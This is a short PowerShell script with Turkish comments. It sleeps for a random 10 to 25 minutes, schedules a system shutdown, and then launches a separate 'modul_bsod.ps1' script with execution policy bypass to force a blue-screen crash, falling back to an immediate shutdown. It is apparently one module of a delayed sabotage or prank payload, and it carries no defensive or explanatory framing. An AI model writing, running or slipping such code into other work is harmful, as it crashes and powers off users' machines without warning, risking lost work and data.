$toplamSure = Get-Random -Min 600 -Max 1500  # 10-25 dakika
Start-Sleep -Seconds $toplamSure

# 1. Kapatma komutunu planla (10 saniye sonra)
try {
    Start-Process -NoNewWindow -FilePath "shutdown" -ArgumentList "/s /t 10"
    Write-Host "⚠️ Kapanma komutu verildi (10 saniye sonra)" -ForegroundColor Red
} catch {}

# 2. 2 saniye bekle (zamanlayıcının oturması için)
Start-Sleep -Seconds 2

# 3. BSOD'yu tetikle
try {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File modul_bsod.ps1"
} catch {
    # BSOD çalışmazsa doğrudan kapat
    Start-Process -NoNewWindow -FilePath "shutdown" -ArgumentList "/s /t 0"
}